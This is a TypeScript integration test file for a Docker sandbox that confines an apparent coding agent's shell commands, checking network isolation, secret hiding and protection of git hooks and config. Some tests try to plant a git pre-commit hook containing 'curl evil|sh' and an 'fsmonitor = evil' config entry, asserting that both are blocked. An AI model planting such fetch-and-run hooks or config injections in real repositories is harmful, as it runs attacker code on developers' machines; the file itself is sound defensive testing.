// src/exec/docker.test.ts — integration tests against a REAL container. Skipped when Docker (or the image) is unavailable.
import { afterAll, beforeAll, describe, expect, test } from "bun:test";
import type { ChildProcess } from "node:child_process";
import { existsSync, readFileSync, realpathSync } from "node:fs";
import { mkdir, symlink, writeFile } from "node:fs/promises";
import { homedir } from "node:os";
import { join } from "node:path";
import { makeToolContext } from "../../test/helpers/tool-context";
import { makeTmpDir, removeDir } from "../../test/helpers/tmp";
import { bashTool } from "../tools/bash/bash";
import { DockerBackend, protectedPaths, sweepLeftoverContainers } from "./docker";

const IMAGE = "alpine:3.22";
const dockerUp = Bun.spawnSync(["docker", "info"], { stdout: "ignore", stderr: "ignore" }).exitCode === 0;
const imagePresent = dockerUp && Bun.spawnSync(["docker", "image", "inspect", IMAGE], { stdout: "ignore", stderr: "ignore" }).exitCode === 0;
if (!imagePresent) console.warn(`[docker.test] SKIPPED: needs a running Docker daemon with ${IMAGE} present (docker info ${dockerUp ? "ok" : "failed"})`);
const d = imagePresent ? describe : describe.skip;

const sh = (cmd: string[]) => Bun.spawnSync(cmd, { stdout: "pipe", stderr: "pipe" });
const containerExists = (name: string) => sh(["docker", "inspect", name]).exitCode === 0;
const inContainer = (name: string, script: string) => sh(["docker", "exec", name, "sh", "-c", script]).stdout.toString();

function collect(child: ChildProcess) {
  return new Promise<{ out: string; err: string; code: number | null }>((resolve) => {
    let out = "";
    let err = "";
    child.stdout!.setEncoding("utf8").on("data", (s: string) => (out += s));
    child.stderr!.setEncoding("utf8").on("data", (s: string) => (err += s));
    child.once("close", (code) => resolve({ out, err, code }));
  });
}
async function until(check: () => boolean, ms = 10_000) {
  const end = Date.now() + ms;
  while (!check()) {
    if (Date.now() > end) throw new Error("condition not met in time");
    await Bun.sleep(50);
  }
}

describe("protectedPaths", () => {
  test("links that leave the workspace (or dangle) make the sandbox refuse, and nothing is created through them", async () => {
    const ws = await makeTmpDir("tropos-prot-");
    const outside = await makeTmpDir("tropos-out-");
    try {
      await symlink(outside, join(ws, ".git"));
      expect(() => protectedPaths(ws)).toThrow(/leaves the workspace/);
      expect(existsSync(join(outside, "hooks"))).toBe(false);
      await removeDir(join(ws, ".git"));
      await mkdir(join(ws, ".git"));
      await symlink(join(outside, "missing"), join(ws, ".git", "hooks"));
      expect(() => protectedPaths(ws)).toThrow(/broken link/);
      expect(existsSync(join(outside, "missing"))).toBe(false);
      await removeDir(join(ws, ".git", "hooks"));
      // The other half is still checked when only one of the two is bad.
      await symlink(outside, join(ws, ".git", "config"));
      expect(() => protectedPaths(ws)).toThrow(/leaves the workspace/);
      await removeDir(join(ws, ".git", "config"));
      await symlink(outside, join(ws, ".husky"));
      expect(() => protectedPaths(ws)).toThrow(/leaves the workspace/);
    } finally {
      await removeDir(ws);
      await removeDir(outside);
    }
  });

  test("symlinks are followed: a linked .git, hooks dir and .husky protect their real targets", async () => {
    const ws = await makeTmpDir("tropos-prot-");
    try {
      await mkdir(join(ws, ".gitdata", "realhooks"), { recursive: true });
      await symlink(join(ws, ".gitdata"), join(ws, ".git"));
      await symlink(join(ws, ".gitdata", "realhooks"), join(ws, ".gitdata", "hooks"));
      await mkdir(join(ws, "realhusky"));
      await symlink(join(ws, "realhusky"), join(ws, ".husky"));
      const paths = protectedPaths(ws).map((p) => realpathSync(p));
      expect(paths).toContain(realpathSync(join(ws, ".gitdata", "realhooks")));
      expect(paths).toContain(realpathSync(join(ws, ".gitdata", "config")));
      expect(paths).toContain(realpathSync(join(ws, "realhusky")));
    } finally {
      await removeDir(ws);
    }
  });

  test("a repo's hooks and config, created empty when missing so a mount can cover them", async () => {
    const ws = await makeTmpDir("tropos-prot-");
    try {
      await mkdir(join(ws, ".git"));
      expect(protectedPaths(ws)).toEqual([join(ws, ".git", "hooks"), join(ws, ".git", "config")]);
      expect(existsSync(join(ws, ".git", "hooks"))).toBe(true);
      expect(readFileSync(join(ws, ".git", "config"), "utf8")).toBe("");
    } finally {
      await removeDir(ws);
    }
  });
  test("an existing config is left as it is", async () => {
    const ws = await makeTmpDir("tropos-prot-");
    try {
      await mkdir(join(ws, ".git"));
      await writeFile(join(ws, ".git", "config"), "[core]\n\tbare = false\n");
      protectedPaths(ws);
      expect(readFileSync(join(ws, ".git", "config"), "utf8")).toBe("[core]\n\tbare = false\n");
    } finally {
      await removeDir(ws);
    }
  });
  test("submodules, including nested and slash-named ones, are covered too", async () => {
    const ws = await makeTmpDir("tropos-prot-");
    try {
      for (const dir of [".git/modules/plain", ".git/modules/libs/foo", ".git/modules/plain/modules/inner"]) {
        await mkdir(join(ws, dir), { recursive: true });
        await writeFile(join(ws, dir, "HEAD"), "ref: refs/heads/main\n");
      }
      const paths = protectedPaths(ws);
      for (const dir of [".git/modules/plain", ".git/modules/libs/foo", ".git/modules/plain/modules/inner"]) {
        expect(paths).toContain(join(ws, dir, "hooks"));
        expect(paths).toContain(join(ws, dir, "config"));
      }
    } finally {
      await removeDir(ws);
    }
  });
  test("a .git file (worktree, submodule checkout) is protected as a file; .husky only when present; no .git means nothing to mount", async () => {
    const ws = await makeTmpDir("tropos-prot-");
    try {
      expect(protectedPaths(ws)).toEqual([]);
      await writeFile(join(ws, ".git"), "gitdir: ../elsewhere\n");
      await mkdir(join(ws, ".husky"));
      expect(protectedPaths(ws)).toEqual([join(ws, ".git"), join(ws, ".husky")]);
    } finally {
      await removeDir(ws);
    }
  });
});

d("DockerBackend (real container)", () => {
  let ws: string;
  let backend: DockerBackend;
  const run = (script: string, cwd = ws) => collect(backend.spawn({ shell: "/bin/bash", script, cwd, env: { SECRET_TEST: "1", ANTHROPIC_API_KEY: "sk" } }));

  beforeAll(async () => {
    ws = await makeTmpDir("tropos-dock-");
    await mkdir(join(ws, "sub"));
    process.env.SECRET_TEST = "1";
    backend = new DockerBackend({ workspace: ws });
  });
  afterAll(async () => {
    delete process.env.SECRET_TEST;
    await backend.close();
    await removeDir(ws);
  });

  test("the first command starts the container lazily; the missing /bin/bash falls back to sh", async () => {
    expect(containerExists(backend.name)).toBe(false);
    const r = await run("echo hello; pwd");
    expect(r.out).toBe(`hello\n${ws}\n`);
    expect(r.code).toBe(0);
    expect(containerExists(backend.name)).toBe(true);
  });

  test("the container has the hardening flags", () => {
    const j = JSON.parse(sh(["docker", "inspect", backend.name]).stdout.toString())[0];
    expect(j.HostConfig.NetworkMode).toBe("none");
    expect(j.HostConfig.ReadonlyRootfs).toBe(true);
    expect(j.HostConfig.CapDrop).toEqual(["ALL"]);
    expect(j.HostConfig.SecurityOpt).toContain("no-new-privileges");
    expect(j.HostConfig.PidsLimit).toBe(256);
    expect(j.HostConfig.Memory).toBe(1024 ** 3);
    expect(j.Config.Labels.tropos).toBe("1");
  });

  test("exit codes and stderr pass through", async () => {
    const r = await run("echo oops >&2; exit 3");
    expect(r.err).toBe("oops\n");
    expect(r.code).toBe(3);
  });

  test("host environment variables are not visible", async () => {
    const r = await run('echo "[${SECRET_TEST-unset}][${ANTHROPIC_API_KEY-unset}][${USER-unset}][$HOME]"; env | wc -l');
    const [line, count] = r.out.trim().split("\n");
    expect(line).toBe("[unset][unset][unset][/tmp]");
    expect(Number(count)).toBeLessThan(10);
    expect(process.env.SECRET_TEST).toBe("1");
  });

  test("the host home directory, ~/.ssh and ~/.tropos are not visible", async () => {
    const home = homedir();
    const r = await run(`for p in ${JSON.stringify(home)} ${JSON.stringify(join(home, ".ssh"))} ${JSON.stringify(join(home, ".tropos"))} /Users /root/.ssh; do [ -e "$p" ] && echo "VISIBLE $p"; done; echo done`);
    expect(r.out).toBe("done\n");
  });

  test("the network is closed", async () => {
    const r = await run("wget -T2 -qO- http://1.1.1.1; echo status=$?");
    expect(r.out).not.toContain("<html");
    expect(r.out.trim()).not.toBe("status=0");
    expect(r.out).toMatch(/status=[1-9]/);
  });

  test("the root filesystem is read-only; /tmp and the workspace are writable", async () => {
    const r = await run(`touch /etc/x 2>&1; echo etc=$?; touch /usr/x 2>&1; echo usr=$?; echo a > /tmp/t && echo tmp=ok; echo b > ${JSON.stringify(join(ws, "made.txt"))} && echo ws=ok`);
    expect(r.out).toMatch(/etc=[1-9]/);
    expect(r.out).toMatch(/usr=[1-9]/);
    expect(r.out).toContain("tmp=ok");
    expect(r.out).toContain("ws=ok");
    expect(readFileSync(join(ws, "made.txt"), "utf8")).toBe("b\n");
  });

  test("files on the host appear in the workspace at the same path, and runs as the invoking user", async () => {
    await writeFile(join(ws, "from-host.txt"), "hi");
    const r = await run(`cat ${JSON.stringify(join(ws, "from-host.txt"))}; id -u`);
    expect(r.out).toBe(`hi${process.getuid!()}\n`);
  });

  test("privileges are dropped", async () => {
    const r = await run("grep -E '^(CapEff|NoNewPrivs)' /proc/self/status");
    expect(r.out).toContain("CapEff:\t0000000000000000");
    expect(r.out).toContain("NoNewPrivs:\t1");
  });

  test("cwd markers map the container path to the host path", async () => {
    const m = backend.cwdMarker("t1");
    expect(m.inside).toBe("/run/tropos/cwd-t1");
    expect(m.host.endsWith("cwd-t1")).toBe(true);
    const r = await run(`cd sub && pwd -P > '${m.inside}'`);
    expect(r.code).toBe(0);
    expect(readFileSync(m.host, "utf8").trim()).toBe(join(ws, "sub"));
  });

  test("signal() kills the command and its children inside the container", async () => {
    const child = backend.spawn({ shell: "/bin/sh", script: "sleep 300 & sleep 301; wait", cwd: ws, env: {} });
    const done = collect(child);
    await until(() => inContainer(backend.name, "ps").includes("sleep 301"));
    expect(backend.alive(child)).toBe(true);
    backend.signal(child, "SIGTERM");
    await done;
    await until(() => !inContainer(backend.name, "ps").includes("sleep 30"));
    expect(backend.alive(child)).toBe(false);
  });

  test("a command that ignores SIGTERM dies on SIGKILL", async () => {
    const child = backend.spawn({ shell: "/bin/sh", script: "trap '' TERM; while :; do sleep 1; done", cwd: ws, env: {} });
    const done = collect(child);
    await until(() => backend.alive(child) && inContainer(backend.name, "ps").includes("sleep 1"));
    backend.signal(child, "SIGTERM");
    await Bun.sleep(1500);
    expect(backend.alive(child)).toBe(true);
    backend.signal(child, "SIGKILL");
    await done;
    await until(() => !backend.alive(child));
    expect(inContainer(backend.name, "ps")).not.toContain("while");
  });

  test("single container for many commands, including concurrent first ones", async () => {
    const b = new DockerBackend({ workspace: ws });
    try {
      const rs = await Promise.all([1, 2, 3].map((n) => collect(b.spawn({ shell: "/bin/sh", script: `echo ${n}`, cwd: ws, env: {} }))));
      expect(rs.map((r) => r.out.trim()).sort()).toEqual(["1", "2", "3"]);
      const ids = sh(["docker", "ps", "-q", "--filter", `name=${b.name}`]).stdout.toString().trim().split("\n");
      expect(ids.length).toBe(1);
    } finally {
      await b.close();
    }
  });

  test("close() removes the container and the run dir, and can be repeated", async () => {
    const b = new DockerBackend({ workspace: ws });
    await collect(b.spawn({ shell: "/bin/sh", script: "true", cwd: ws, env: {} }));
    expect(containerExists(b.name)).toBe(true);
    await b.close();
    expect(containerExists(b.name)).toBe(false);
    expect(existsSync(b.runDir)).toBe(false);
    await b.close();
  });

  test("a spawn after close() fails with a clear message instead of hanging", async () => {
    const b = new DockerBackend({ workspace: ws });
    await b.close();
    const r = await collect(b.spawn({ shell: "/bin/sh", script: "echo no", cwd: ws, env: {} }));
    expect(r.code).toBe(125);
    expect(r.err).toContain("closed");
  });

  test("a missing docker binary is a quick, clear failure", async () => {
    const b = new DockerBackend({ workspace: ws, dockerBin: "/nonexistent/docker" });
    const r = await collect(b.spawn({ shell: "/bin/sh", script: "echo no", cwd: ws, env: {} }));
    expect(r.code).not.toBe(0);
    expect(r.err).toContain("not found");
    await b.close();
  });

  test("a missing image fails clearly, and a later spawn retries", async () => {
    const b = new DockerBackend({ workspace: ws, image: "tropos-no-such-image.invalid/x:0" });
    const r = await collect(b.spawn({ shell: "/bin/sh", script: "echo no", cwd: ws, env: {} }));
    expect(r.code).toBe(125);
    expect(r.err).toContain("tropos sandbox: could not start the container");
    const r2 = await collect(b.spawn({ shell: "/bin/sh", script: "echo no", cwd: ws, env: {} }));
    expect(r2.code).toBe(125);
    await b.close();
  }, 60_000);

  test("sweepLeftoverContainers removes labelled containers of dead owners, keeps ours", async () => {
    const stale = `tropos-stale-${Date.now()}`;
    sh(["docker", "run", "-d", "--rm", "--name", stale, "--label", "tropos=1", "--label", "tropos.pid=999999", "--network", "none", IMAGE, "sleep", "infinity"]);
    expect(containerExists(stale)).toBe(true);
    expect(containerExists(backend.name)).toBe(true);
    const n = await sweepLeftoverContainers();
    expect(n).toBeGreaterThanOrEqual(1);
    await until(() => !containerExists(stale));
    expect(containerExists(backend.name)).toBe(true);
  }, 60_000);
});

d("Bash tool with ctx.exec = DockerBackend", () => {
  let ws: string;
  let backend: DockerBackend;
  const ctx = (over = {}) => makeToolContext({ root: ws, exec: backend, ...over });

  beforeAll(async () => {
    ws = await makeTmpDir("tropos-dockbash-");
    await mkdir(join(ws, "sub"));
    backend = new DockerBackend({ workspace: ws });
  });
  afterAll(async () => {
    await backend.close();
    await removeDir(ws);
  });

  test("runs a command in the container and tracks cd", async () => {
    const c = ctx();
    const r = await bashTool.run({ command: "cd sub && echo in-$(pwd)" }, c);
    expect(r.content).toBe(`in-${join(ws, "sub")}`);
    expect(c.cwd()).toBe(join(ws, "sub"));
    const r2 = await bashTool.run({ command: "pwd; echo x > f.txt" }, c);
    expect(r2.content).toBe(join(ws, "sub"));
    expect(readFileSync(join(ws, "sub", "f.txt"), "utf8")).toBe("x\n");
  });

  test("reports exit codes", async () => {
    const r = await bashTool.run({ command: "exit 4" }, ctx());
    expect(r.isError).toBe(true);
    expect(r.content).toContain("[exit code 4]");
  });

  test("a timeout kills the command inside the container", async () => {
    const t0 = Date.now();
    const r = await bashTool.run({ command: "sleep 300", timeout_ms: 1000 }, ctx());
    expect(r.content).toContain("timed out");
    expect(Date.now() - t0).toBeLessThan(10_000);
    await until(() => !inContainer(backend.name, "ps").includes("sleep 300"));
  }, 30_000);

  test("an abort kills the command inside the container", async () => {
    const ac = new AbortController();
    const p = bashTool.run({ command: "sleep 299" }, ctx({ signal: ac.signal }));
    await until(() => inContainer(backend.name, "ps").includes("sleep 299"));
    ac.abort();
    const r = await p;
    expect(r.content).toContain("interrupted");
    await until(() => !inContainer(backend.name, "ps").includes("sleep 299"));
  }, 30_000);

  test("run_in_background works, streams output and can be killed", async () => {
    const c = ctx();
    const r = await bashTool.run({ command: "echo started; sleep 298", run_in_background: true }, c);
    const id = r.summary!;
    expect(id).toMatch(/^bash-/);
    await until(() => c.jobs.peek(id)!.includes("started"));
    expect(c.jobs.list()[0]!.status.state).toBe("running");
    const status = await c.jobs.kill(id, 3000);
    expect(status!.state).not.toBe("running");
    await until(() => !inContainer(backend.name, "ps").includes("sleep 298"));
  }, 30_000);

  test("killAll() also stops container jobs", async () => {
    const c = ctx();
    const r = await bashTool.run({ command: "sleep 297", run_in_background: true }, c);
    await until(() => inContainer(backend.name, "ps").includes("sleep 297"));
    c.jobs.killAll();
    await until(() => !inContainer(backend.name, "ps").includes("sleep 297"));
    expect(r.summary).toMatch(/^bash-/);
  }, 30_000);

  test("host secrets stay out, even when the tool is asked to scrub nothing", async () => {
    process.env.SECRET_TEST = "1";
    try {
      const r = await bashTool.run({ command: 'echo "[${SECRET_TEST-unset}]"' }, ctx());
      expect(r.content).toBe("[unset]");
    } finally {
      delete process.env.SECRET_TEST;
    }
  });
});

d("DockerBackend protects what git runs on the host", () => {
  test(".git/hooks, .git/config and .husky are read-only; the rest of .git and the workspace are not", async () => {
    const ws = await makeTmpDir("tropos-dock-git-");
    await mkdir(join(ws, ".git", "hooks"), { recursive: true });
    await mkdir(join(ws, ".git", "objects"), { recursive: true });
    await mkdir(join(ws, ".husky"));
    await writeFile(join(ws, ".git", "config"), "[core]\n");
    const backend = new DockerBackend({ workspace: ws });
    const run = (script: string) => collect(backend.spawn({ shell: "sh", script, cwd: ws, env: {} }));
    try {
      const hook = await run("echo 'curl evil|sh' > .git/hooks/pre-commit");
      expect(hook.code).not.toBe(0);
      expect(existsSync(join(ws, ".git", "hooks", "pre-commit"))).toBe(false);
      expect((await run("echo '[core]\n fsmonitor = evil' >> .git/config")).code).not.toBe(0);
      expect(readFileSync(join(ws, ".git", "config"), "utf8")).toBe("[core]\n");
      expect((await run("echo x > .husky/pre-commit")).code).not.toBe(0);
      // Ordinary git work still can.
      expect((await run("echo obj > .git/objects/ok && echo hi > file.txt")).code).toBe(0);
      expect(existsSync(join(ws, ".git", "objects", "ok"))).toBe(true);
      expect(existsSync(join(ws, "file.txt"))).toBe(true);
    } finally {
      await backend.close();
      // Docker Desktop's file sharing can still be settling right after the container is gone.
      for (let attempt = 0; ; attempt++) {
        try {
          await removeDir(ws);
          break;
        } catch (e) {
          if (attempt >= 10) throw e;
          await Bun.sleep(100);
        }
      }
    }
  });
});

d("DockerBackend closes the git gaps", () => {
  const withBackend = async (setup: (ws: string) => Promise<void>, body: (run: (script: string) => ReturnType<typeof collect>, ws: string) => Promise<void>) => {
    const ws = await makeTmpDir("tropos-dock-gap-");
    await setup(ws);
    const backend = new DockerBackend({ workspace: ws });
    try {
      await body((script) => collect(backend.spawn({ shell: "sh", script, cwd: ws, env: {} })), ws);
    } finally {
      await backend.close();
      for (let attempt = 0; ; attempt++) {
        try {
          await removeDir(ws);
          break;
        } catch (e) {
          if (attempt >= 10) throw e;
          await Bun.sleep(100);
        }
      }
    }
  };

  test("a repo with no hooks directory can't have one planted", async () => {
    await withBackend(
      async (ws) => void (await mkdir(join(ws, ".git"), { recursive: true })),
      async (run, ws) => {
        expect((await run("mkdir -p .git/hooks && echo evil > .git/hooks/pre-commit")).code).not.toBe(0);
        expect((await run("echo '[core]' > .git/config")).code).not.toBe(0);
        expect(existsSync(join(ws, ".git", "hooks", "pre-commit"))).toBe(false);
      },
    );
  });

  test("a .git file can't be pointed somewhere the container controls", async () => {
    await withBackend(
      (ws) => writeFile(join(ws, ".git"), "gitdir: /somewhere/else\n"),
      async (run, ws) => {
        expect((await run("echo 'gitdir: ./evil' > .git")).code).not.toBe(0);
        expect(readFileSync(join(ws, ".git"), "utf8")).toBe("gitdir: /somewhere/else\n");
      },
    );
  });

  test("a submodule's hooks can't be planted either", async () => {
    await withBackend(
      async (ws) => {
        await mkdir(join(ws, ".git", "modules", "lib"), { recursive: true });
        await writeFile(join(ws, ".git", "modules", "lib", "HEAD"), "ref: refs/heads/main\n");
      },
      async (run, ws) => {
        expect((await run("echo evil > .git/modules/lib/hooks/post-checkout")).code).not.toBe(0);
        expect(existsSync(join(ws, ".git", "modules", "lib", "hooks", "post-checkout"))).toBe(false);
      },
    );
  });
});
